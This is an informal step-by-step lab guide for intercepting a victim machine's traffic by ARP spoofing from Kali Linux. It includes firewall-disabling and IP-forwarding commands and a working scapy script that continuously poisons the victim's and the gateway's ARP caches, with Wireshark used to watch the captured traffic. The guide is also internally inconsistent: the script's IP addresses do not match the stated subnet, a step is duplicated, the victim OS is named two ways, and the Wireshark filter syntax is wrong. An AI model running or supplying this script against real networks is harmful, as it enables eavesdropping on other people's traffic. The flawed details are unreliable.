1.first os(attacker ) kali 
   second os(victim) any linux(mine parrot)
2.set the network adapter as bridged for each os in the network settings
3.disable the firewall in both os then use the command in kali to enable forwarding of the traffic echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
4.both the os network must be in the same subnet 
for example Kali ip: 192.168.165.56
ubuntu ip:192.168.165.27
in both ip 192.168.165.xx is common so it is in the same subnet
5.note the gateway of the os
6. in kali linux create a python code 
arpspoofing.py
from scapy.all import *
import sys

def spoof(target_ip, spoof_ip):
    target_mac = getmacbyip(target_ip)
    if target_mac is None:
        print(f"MAC for {target_ip} not found.")
        return
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)
    print(f"Sent spoofed ARP to {target_ip} saying I am {spoof_ip}")

target = "192.168.1.101"   
gateway = "192.168.1.1"    

while True:
    spoof(target, gateway)
    spoof(gateway, target)
    time.sleep(2)
7.Run the python code in kali
8.open wireshark in kali and apply the filter ip.addr = <victim os ip i.e ubuntu's ip>
8.open wireshark in kali and apply the filter ip.addr = <victim os ip i.e ubuntu's ip>
9.In ubuntu perform any browsing or ping activities those traffics can be seen in the kali wireshark environment
